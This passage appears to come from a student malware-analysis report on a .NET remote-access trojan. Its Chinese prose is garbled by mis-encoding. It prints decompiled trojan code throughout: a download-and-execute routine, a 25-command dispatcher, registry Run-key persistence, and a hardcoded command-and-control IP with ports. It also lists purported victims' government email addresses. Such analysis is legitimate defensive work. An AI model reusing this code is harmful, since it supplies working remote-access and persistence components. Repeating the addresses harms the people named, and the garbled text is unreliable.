<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/SLCLRNS/dlrarhsivascreen</code>
<a href=#R-image-614ce2535b11abd12e7735e26ab90436 class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/HyBqS-XTp.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-614ce2535b11abd12e7735e26ab90436><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/HyBqS-XTp.png></a></p></li><li><p>Remove Userâ†’<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/OLRDMR/dlrarhsivaremove_user</code>
é€™ä¸€æ®µæˆ‘èªç‚ºæ˜¯æƒ³è¾¦æ³•æŠŠä¸€äº›è³‡æ–™pullä¸‹ä¾†å¾Œï¼Œä¸¦ä¸”ç›´æ¥åŸ·è¡Œremove userçš„å‹•ä½œï¼Œæ‰€ä»¥å¯¦éš›è·Ÿé€²å»==dlrarhsivapull_data==é€™å€‹methodï¼Œæœƒç™¼ç¾çš„ç¢ºå¦‚æˆ‘æ‰€é æ¸¬ï¼Œåªä¸éå¯¦ä½œçš„æ–¹æ³•æ˜¯ä»–å…ˆå¾serveré‚£ä¸€ç«¯çœ‹æœ‰å¤šå°‘çš„byteséœ€è¦pullï¼Œç„¶å¾ŒæŠŠè©²å€¼è½‰æˆintå¾Œå°±ç›´æ¥pullè³‡æ–™
:::spoiler dlrarhsivapull_data() Source Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.OLRDMR
// Token: 0x06000036 RID: 54 RVA: 0x0000480C File Offset: 0x00002A0C
public void dlrarhsivaremove_user()
{
    try
    {
        byte[] array = this.server.dlrarhsivapull_data();
        if (array != null)
        {
            if (!File.Exists(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;))
            {
                File.WriteAllBytes(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;, array);
                this.dlrarhsivado_process(DLAONIF.dlrarhsivaget_mpath() + DLAONIF.dlrarhsivaremvUser + &#34;.exe&#34;);
            }
        }
    }
    catch
    {
    }
}</code></pre></div><p>:::</p></li><li><p>Fetch Victim&rsquo;s Infoâ†’<code>dlrarhsiva/dlrarhsiva.cxc/dlrarhsiva/MLRLEINF/dlrarhsivaInfo</code>
å¾ä»¥ä¸‹source codeå¯ä»¥çŸ¥é“ä½¿ç”¨Infoé€™å€‹commandå¯ä»¥å¾—çŸ¥victimçš„Usernameæˆ–æ˜¯MachineName
:::spoiler dlrarhsivaInfo() Source Code</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#75715e>// dlrarhsiva.MLRLEINF</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Token: 0x06000031 RID: 49 RVA: 0x0000472C File Offset: 0x0000292C</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> dlrarhsivaInfo()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivaapver = <span style=color:#e6db74>&#34;M.0.0.5|dlrarhsiva&#34;</span>.Split(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[]
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;|&#39;</span>
</span></span><span style=display:flex><span>    })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivacname = Environment.MachineName;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauname = Environment.UserName;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauip = <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivalancard = <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>}</span></span></code></pre></div><p>:::</p></li><li><p>Others
ç”±æ–¼æ”»æ“Šè€…å¯ä»¥ä½¿ç”¨çš„commandå¯¦åœ¨æ˜¯å¤ªå¤šäº†ï¼Œæ‰€ä»¥å°±ç›´æ¥åˆ—å‡ºä¾†çœ‹æ¯”è¼ƒæ¸…æ¥š
<a href=#R-image-b0fdb6adc55939981f7875797e7406cc class=lightbox-link><img alt=image class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/Hyb8sb766.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-b0fdb6adc55939981f7875797e7406cc><img alt=image class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/Hyb8sb766.png></a>
æ¯”è¼ƒé‡è¦çš„æ˜¯get_commandé€™å€‹methodï¼Œé€™å€‹å°±å’Œå‰é¢æåˆ°çš„pull dataé‚£å€‹å·®ä¸å¤šï¼Œåªæ˜¯ä»–å¾Œé¢é‚„æœƒå¸¶ä¸Šcommandå’Œargumentï¼Œä¾¿æ–¼ä¸‹ä¸€äº›æŒ‡ä»¤</p><p>å¦å¤–ï¼Œ<code>dlrarhsivaimage_info()</code>é€™å€‹methodä¸»è¦æ˜¯çœ‹æŒ‡å®šçš„åœ–ç‰‡çš„ä¸€äº›ç›¸é—œè³‡è¨Šä¸¦ä¸”æŠŠè©²æª”æ¡ˆä¸Šå‚³åˆ°æŸå€‹åœ°æ–¹ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œé‚„å¯ä»¥åšåˆ°åˆªé™¤æª”æ¡ˆã€ä¸Šå‚³æª”æ¡ˆã€å„²å­˜æª”æ¡ˆã€æŸ¥çœ‹userè³‡è¨Šç­‰ç­‰ï¼Œæ‰€æœ‰çš„commandå¯ä»¥æŸ¥çœ‹<code>dlrarhsivasee_responce()</code>é€™å€‹methodï¼Œè£¡é¢æœ‰ç´€éŒ„æ‰€æœ‰é‡åˆ°ä¸åŒçš„commandæœƒåŸ·è¡Œå°æ‡‰çš„method(å…±æœ‰25å€‹ï¼Œè©³ç´°source codeå¦‚ä¸‹)
:::spoiler</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
// Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8
private void dlrarhsivasee_responce()
{
    if (!this.dlrarhsivaiswitch)
    {
        this.dlrarhsivaiswitch = true;
        this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck);
        this.dlrarhsivacapScreen = false;
        while (this.dlrarhsivais_working)
        {
            MLREDM.&lt;&gt;c__DisplayClasse CS$&lt;&gt;8__locals1 = new MLREDM.&lt;&gt;c__DisplayClasse();
            CS$&lt;&gt;8__locals1.&lt;&gt;4__this = this;
            CS$&lt;&gt;8__locals1.switchType = this.dlrarhsivaget_command();
            if (CS$&lt;&gt;8__locals1.switchType == null)
            {
                this.dlrarhsivais_working = false;
                break;
            }
            this.dlrarhsivareqCnls = false;
            string text = CS$&lt;&gt;8__locals1.switchType[0].ToLower();
            if (text.Split(new char[]
            {
                &#39;-&#39;
            }).Length &gt; 1)
            {
                text = &#34;dlrarhsiva-&#34; + text.Split(new char[]
                {
                    &#39;-&#39;
                })[1];
            }
            else
            {
                text = &#34;dlrarhsiva-&#34; + text;
            }
            string text2 = text;
            switch (text2)
            {
            case &#34;dlrarhsiva-procl&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    this.dlrarhsivalist_processes(&#34;procl&#34;);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-getavs&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    this.dlrarhsivalist_processes(&#34;getavs&#34;);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-thumb&#34;:
                this.dlrarhsivaimage_info(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-putsrt&#34;:
                this.dlrarhsivaload_app();
                break;
            case &#34;dlrarhsiva-filsz&#34;:
                this.dlrarhsivafile_info(CS$&lt;&gt;8__locals1.switchType[1], false);
                break;
            case &#34;dlrarhsiva-rupth&#34;:
                this.dlrarhsivapush_data(null, &#34;dlrarhsiva-appth=|dlrarhsiva&#34;.Split(new char[]
                {
                    &#39;|&#39;
                })[0] + DLAONIF.dlrarhsivaget_mpath(), false);
                break;
            case &#34;dlrarhsiva-dowf&#34;:
                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-endpo&#34;:
                try
                {
                    Process.GetProcessById((int)Convert.ToInt16(CS$&lt;&gt;8__locals1.switchType[1].Trim())).Kill();
                }
                catch
                {
                }
                break;
            case &#34;dlrarhsiva-scrsz&#34;:
                this.dlrarhsivascreenSize(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-cscreen&#34;:
                this.dlrarhsivasee_scren(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-dirs&#34;:
                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives));
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-stops&#34;:
                this.dlrarhsivacapScreen = false;
                break;
            case &#34;dlrarhsiva-scren&#34;:
                this.dlrarhsivacapScreen = true;
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivais_screen(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-cnls&#34;:
                this.dlrarhsivaautCnls = true;
                this.dlrarhsivareqCnls = true;
                this.dlrarhsivacapScreen = false;
                break;
            case &#34;dlrarhsiva-udlt&#34;:
                this.dlrarhsivaCMD.dlrarhsivaremove_user();
                break;
            case &#34;dlrarhsiva-delt&#34;:
                this.dlrarhsivaremove_file(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-afile&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivasend_auto(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-listf&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-file&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_file(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-info&#34;:
                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info));
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-runf&#34;:
                this.dlrarhsivaCMD.dlrarhsivado_process(CS$&lt;&gt;8__locals1.switchType[1].Split(new char[]
                {
                    &#39;&gt;&#39;
                })[0]);
                break;
            case &#34;dlrarhsiva-fles&#34;:
            {
                string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$&lt;&gt;8__locals1.switchType[1]);
                if (files != null)
                {
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fles=|dlrarhsiva&#34;.Split(new char[]
                        {
                            &#39;|&#39;
                        })[0] + files, false);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                }
                break;
            }
            case &#34;dlrarhsiva-dowr&#34;:
                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-fldr&#34;:
            {
                string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$&lt;&gt;8__locals1.switchType[1]);
                if (Folders != null)
                {
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fldr=|dlrarhsiva&#34;.Split(new char[]
                        {
                            &#39;|&#39;
                        })[0] + Folders, false);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                }
                break;
            }
            }
        }
        this.dlrarhsivais_working = false;
        this.dlrarhsivacapScreen = false;
    }
    this.dlrarhsivaiswitch = false;
}</code></pre></div><p>:::</p></li></ol><h3 id=å¸¸é§æ–¹å¼>å¸¸é§æ–¹å¼</h3><ol><li>æ ¹æ“šAny.Runçš„ATT&amp;CK Matrixä»¥åŠæˆ‘è‡ªå·±åˆ†æçš„çµæœï¼Œçœ‹åˆ°ä»–ä½¿ç”¨timeré€™å€‹æ–¹å¼ç•¶ä½œpersistençš„æ‰‹æ³•ï¼Œç•¶do_start() methodå•Ÿå‹•ä¹‹å¾Œï¼Œéš”ä¸€æ®µæ™‚é–“å°±æœƒè§¸ç™¼é€£ç·šï¼Œä¸¦ä¸”æ¯éš”ä¸€æ®µæ™‚é–“å°±æœƒé‡æ–°æª¢æŸ¥connection(é›–ç„¶Any.Runæ²’æœ‰çœ‹å‡ºä¾†)ï¼Œæ‰€ä»¥æˆ‘çŒœé€™å€‹æ‰‹æ³•å°æ‡‰çš„<a href=https://attack.mitre.org/techniques/T1053/006/ rel=external target=_blank>ATT&amp;CK IDæ‡‰è©²æ˜¯T1053.006</a><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public void dlrarhsivado_start()
{
    DLAONIF.dlrarhsivaport = DLAONIF.ports[0];
    this.dlrarhsivaUPC = new MLRLEINF();
    this.dlrarhsivaCMD = new OLRDMR(this);
    this.dlrarhsivaHD.iserver = this;
    this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath();
    TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect);
    System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420);
    this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer;
}</code></pre></div></li><li>å¦å¤–ï¼Œç„¡æ„é–“ç”¨Autorunç™¼ç¾ä»–æœ‰æŠŠ<code>Hdlharas\dlrarhsiva.exe</code>è¨»å†Šåˆ°registryä¸­ï¼Œé€™ä¹Ÿæ˜¯å¸¸è¦‹çš„å¥—è·¯ï¼Œä»¥ATT&amp;CKçš„frameworkä¾†èªªï¼Œæ‡‰è©²æ˜¯<a href=https://attack.mitre.org/techniques/T1547/001/ rel=external target=_blank>T1547.001</a>(Any.Runé‚„æ˜¯æ²’æœ‰çœ‹å‡ºä¾†)ï¼Œè©³ç´°çš„codeå¦‚ä¸‹
<a href=#R-image-76ef84c382eb65e58b7ada019cd13a3b class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/rygmHumT6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-76ef84c382eb65e58b7ada019cd13a3b><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/rygmHumT6.png></a><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public static void dlrarhsivaset_run(string app, string path)
{
    try
    {
        string name = &#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dlrarhsiva&#34;.Split(new char[]
        {
            &#39;|&#39;
        })[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        string str = DLAONIF.dlrarhsivapc_id;
        object value = registryKey.GetValue(str + app);
        if (value == null)
        {
            registryKey.SetValue(str + app, path);
        }
        else if (value.ToString() != path)
        {
            registryKey.SetValue(str + app, path);
        }
    }
    catch
    {
    }
}</code></pre></div>é€™æ˜¯åœ¨<code>DLAONIF</code>é€™å€‹moduleä¸­ï¼Œä¸»è¦æœƒç”±<code>MLREDM/dlrarhsivaload_app</code>é€™å€‹methodå‘¼å«åˆ°ï¼Œå°æ‡‰å€’çš„æŒ‡ä»¤æ˜¯==dlrarhsiva-putsrt==
<a href=#R-image-71a7fbce32d420d833ed1a4bea772fa8 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/SJqMqdXa6.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-71a7fbce32d420d833ed1a4bea772fa8><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/SJqMqdXa6.png></a></li></ol><h2 id=ä¸­ç¹¼ç«™>ä¸­ç¹¼ç«™</h2><h3 id=åŸºæœ¬è³‡è¨Š>åŸºæœ¬è³‡è¨Š</h3><p>åœ¨å‰é¢æåˆ°çš„å¾Œé–€åŠŸèƒ½ä¸­æœ‰ä¸€å€‹æ˜¯å°ˆé–€è™•ç†ç¶²è·¯é€£ç·šçš„(<code>dlrarhsivaIPSConfig</code>)ï¼Œé€™å…¶å¯¦è »æœ‰è¶£çš„ï¼Œä»–ä¸ç›´æ¥å¯«å‡ºé€£ç·šçš„IPï¼Œåè€Œæ˜¯åšäº†ç°¡å–®çš„asciiè½‰æ›å¾Œæ‰é€²è¡Œé€£ç·šï¼Œå¦‚ä¸‹æ‰€ç¤º</p><ol><li>MLREDM/dlrarhsivaIPSConfig()
é€™ä¸€æ®µä¸»è¦æ˜¯é€²è¡Œé€£ç·šï¼Œä½†æ˜¯åœ¨é€£ç·šå‰æœƒé€²è¡ŒIP parsingå’Œfetching portçš„å‹•ä½œ(å¦‚ä¸‹ä¸€æ®µæ‰€ç¤º)<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
// Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C
private bool dlrarhsivaIPSConfig()
{
    bool result;
    try
    {
        DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD();
        this.dlrarhsivatcpsck = new TcpClient();
        this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport);
        result = true;
    }
    catch
    {
        this.dlrarhsivaports_switch();
        result = false;
    }
    return result;
}</code></pre></div></li><li>OLRDMR/dlrarhsivaserverIPD()
é€™ä¸€æ®µå°±æ˜¯æŠŠDLAONIF.dlrarhsivavpsipsè½‰æ›æˆUTF-8è€Œå·²ï¼ŒåŸæœ¬æ˜¯asciiçš„integerå½¢å¼ï¼Œè½‰æ›å¾Œå°±è®Šæˆä¸€èˆ¬çš„ascii stringï¼Œä¹Ÿå°±æ˜¯==185.136.161.124==<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace dlrarhsiva
{
    // Token: 0x02000009 RID: 9
    internal class OLRDMR
    {
        ...
        public string dlrarhsivaserverIPD()
        {
            return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length);
        }
        ...
        // Token: 0x0400003A RID: 58
        public MLREDM server;
    }
}</code></pre></div></li><li>DLAONIF/
ä¹Ÿå¯ä»¥è‡ªè¡Œè½‰æ›ä¸‹é¢çš„IPï¼Œå¦å¤–ä»–æœ‰å¥½å¹¾å€‹Portï¼Œè©³ç´°çš„codeå¯ä»¥åƒè€ƒMLREDM/dlrarhsivaports_switch()é€™å€‹methodï¼Œåœ¨default port 6128é€£ä¸ä¸Šå»çš„æ™‚å€™å¯ä»¥è‡ªè¡Œåˆ‡æ›é å…ˆè¨­å®šå¥½çš„port number<div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace dlrarhsiva
{
    // Token: 0x02000002 RID: 2
    internal static class DLAONIF
    {
        ...
        public static int[] ports = new int[]
        {
            6128,
            8761,
            11614,
            15822,
            17443
        };

        // Token: 0x04000005 RID: 5
        public static byte[] dlrarhsivavpsips = new byte[]
        {
            49,
            56,
            53,
            46,
            49,
            51,
            54,
            46,
            49,
            54,
            49,
            46,
            49,
            50,
            52
        };

        // Token: 0x0400000A RID: 10
        public static string dlrarhsivaAppPath = &#34;&#34;;
    }
}</code></pre></div></li></ol><h3 id=é—œé€£è³‡è¨Š>é—œé€£è³‡è¨Š</h3><p>æˆ‘ä¸æ˜¯å¾ˆç¢ºå®šé—œè¯è³‡è¨Šæƒ³è¦çš„å½¢å¼æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥æˆ‘é¸æ“‡åƒè€ƒ<a href=https://ipwhoisinfo.com/ip/185.136.161.124 rel=external target=_blank>whoisçš„çµæœ</a>å’Œ<a href=https://www.virustotal.com/gui/file/0335de8eadbbd5dc7cbe92ef869bcea6f6596ac39a38680142c982ec6e97ecde/behavior rel=external target=_blank>VirusTotalçš„çµæœ</a>äº’ç›¸å°ç…§ï¼Œé€™å€‹IPæ˜¯ä¾†è‡ªæ–¼æ³•åœ‹çš„Strasbourgï¼Œæ˜¯åœ¨å¾·åœ‹èˆ‡æ³•åœ‹è¶…é‚Šç•Œçš„åœ°æ–¹</p><h2 id=å¨è„…æƒ…è³‡>å¨è„…æƒ…è³‡</h2><h3 id=æ”»æ“Šè€…>æ”»æ“Šè€…</h3><p><code>Duty Staff Officer &lt;ram.ratan909@navy.gov.in></code>ï¼Œæˆ‘åœ¨OSINTçš„å„å€‹online tooléƒ½æ²’æœ‰æ‰¾åˆ°ç›¸é—œçš„è³‡è¨Šï¼Œè€Œä¸”æœ‰äº›ç”šè‡³é‚„èªªé€™æ˜¯validï¼Œæƒ³ä¸€æƒ³ä¹Ÿå°ï¼Œé€™å€‹mailçš„formatçœ‹èµ·ä¾†æ˜¯å±¬æ–¼æ”¿åºœå–®ä½ï¼Œæ‰€ä»¥æˆ‘çŒœå¯èƒ½æ˜¯æ”¿åºœå–®ä½çš„æŸå€‹AD accountè¢«æ‹¿ä¸‹ä¾†ï¼Œç„¶å¾Œå°±ç™¼é€é€™æ¨£çš„è¨Šæ¯å‡ºå»ï¼ŒæˆåŠŸç‡çœ‹èµ·ä¾†ä¹Ÿæœƒæ¯”è¼ƒé«˜
:::danger
æ­£ç¢ºç­”æ¡ˆæ˜¯æ”»æ“Šè€…å¯ä»¥ç¯¡æ”¹mailæ–‡ä»¶ä¸­çš„å¯„é€äººå’Œrouterè³‡è¨Šï¼Œæ‰€ä»¥è¦å¯¦éš›å»è£¡é¢çœ‹å¯„é€çš„IPï¼Œæœ‰å¯èƒ½é€™å€‹å°±æ˜¯è©²æ”»æ“Šè€…çš„C2 Serverï¼Œæ‰€ä»¥å…¶å¯¦æ”»æ“Šè€…æ²’æœ‰æŠŠAD accountæ‹¿ä¸‹ä¾†
:::</p><h3 id=æ”»æ“Šæ™‚é–“>æ”»æ“Šæ™‚é–“</h3><p><code>Tue, 28 Apr 2020 10:50:41 +0530 (IST)</code></p><h3 id=å—å®³è€…>å—å®³è€…</h3><p>å¾éƒµä»¶ä¸­çš„CC Userä¾†çœ‹ï¼Œ&ldquo;å¯èƒ½"çš„å—å®³è€…æœ‰ä»¥ä¸‹å¹¾å€‹</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code>&#34;Wg Cdr MA  JAFFER ALI&#34; &lt;jdwcdma@iaf.nic.in&gt;
&#34;Wg Cdr PAWAN BENIWAL&#34; &lt;wanwal.26965@gov.in&gt;
&#34;Wg Cdr Kundan Kumar&#34;&lt;challenger@nic.in&gt;
&#34;Wing Commander Raji kurian&#34; &lt;yatch.master@gov.in&gt;
&#34;SLO 54 ASP&#34; &lt;teacher_town@nic.in&gt;
&#34;Gp Capt Atul Kumar Arora&#34; &lt;moon.light@gov.in&gt;
&#34;Flt Lt Richa Bansal&#34; &lt;mtl.amer@nic.in&gt;</code></pre></div><hr><h1 id=æ¨£æœ¬5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9>æ¨£æœ¬(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9)</h1><h2 id=æƒ¡æ„ç¨‹å¼-1>æƒ¡æ„ç¨‹å¼</h2><h3 id=æª”æ¡ˆè³‡è¨Š-1>æª”æ¡ˆè³‡è¨Š</h3><ol><li>DIE(Detect It Easy)
<a href=#R-image-1150f7c73ea6196bc5f1037099a29907 class=lightbox-link><img alt=åœ–ç‰‡ class="lazy lightbox figure-image" loading=lazy src=https://hackmd.io/_uploads/BygTPpT2T.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-1150f7c73ea6196bc5f1037099a29907><img alt=åœ–ç‰‡ class="lazy lightbox lightbox-image" loading=lazy src=https://hackmd.io/_uploads/BygTPpT2T.png></a>
å¾DIEä¾†çœ‹ä¸¦æ²’æœ‰ä»€éº¼ç‰¹åˆ¥çš„packeræˆ–æ˜¯linkerï¼Œåè€Œå‡ºç¾RTFæ ¼å¼ï¼Œä¸€é–‹å§‹ä¸çŸ¥é“é€™æ˜¯ä»€éº¼ï¼Œä½†æ ¹æ“š<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>çš„èªªæ˜ï¼Œæ‡‰è©²å¯ä»¥ç†è§£æˆæ¯”è¼ƒå»£æ³›æ€§çš„Wordæ–‡å­—æª”æ¡ˆ<blockquote><p>å¯Œæ–‡æœ¬æ ¼å¼ï¼ˆRich Text Format, ä¸€èˆ¬ç°¡ç¨±ç‚ºRTFï¼‰æ˜¯ç”±å¾®è»Ÿå…¬å¸é–‹ç™¼çš„è·¨å¹³å°æ–‡æª”æ ¼å¼ã€‚å¤§å¤šæ•¸çš„æ–‡å­—è™•ç†è»Ÿé«”éƒ½èƒ½è®€å–å’Œä¿å­˜RTFæ–‡æª”ã€‚RTFæ˜¯Rich TextFormatçš„ç¸®å¯«ï¼Œæ„å³å¤šæ–‡æœ¬æ ¼å¼ã€‚é€™æ˜¯ä¸€ç¨®é¡ä¼¼DOCæ ¼å¼ï¼ˆWordæ–‡æª”ï¼‰çš„æª”æ¡ˆï¼Œæœ‰å¾ˆå¥½çš„å…¼å®¹æ€§ï¼Œä½¿ç”¨Windowsâ€œé™„å±¬æª”æ¡ˆâ€ä¸­çš„â€œå¯«å­—æ¿â€å°±èƒ½æ‰“é–‹ä¸¦é€²è¡Œç·¨è¼¯ã€‚RTFæ˜¯ä¸€ç¨®éå¸¸æµè¡Œçš„æª”æ¡ˆçµæ§‹ï¼Œå¾ˆå¤šæ–‡å­—ç·¨è¼¯å™¨éƒ½æ”¯æŒå®ƒã€‚ä¸€èˆ¬çš„æ ¼å¼è¨­å®šï¼Œæ¯”å¦‚å­—å‹å’Œæ®µè½è¨­å®šï¼Œé é¢è¨­å®šç­‰ç­‰ä¿¡æ¯éƒ½å¯ä»¥å­˜åœ¨RTFæ ¼å¼ä¸­ï¼Œå®ƒèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯¦ç¾wordèˆ‡wpsæª”æ¡ˆä¹‹é–“çš„äº’è¨ªã€‚</p></blockquote></li><li>File/Stat/Exiftool
å¾ä»¥ä¸‹çš„çµæœä¾†çœ‹ï¼Œé€™å€‹æª”æ¡ˆçš„ç¢ºæ˜¯RTFæ ¼å¼ä¸”Created Timeæ˜¯åœ¨2019å¹´
:::spoiler Command Result<div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID <span style=color:#ae81ff>1025</span>
</span></span><span style=display:flex><span>$ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
</span></span><span style=display:flex><span>File Name                       : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>Directory                       : .
</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>217</span> KiB
</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:52+08:00
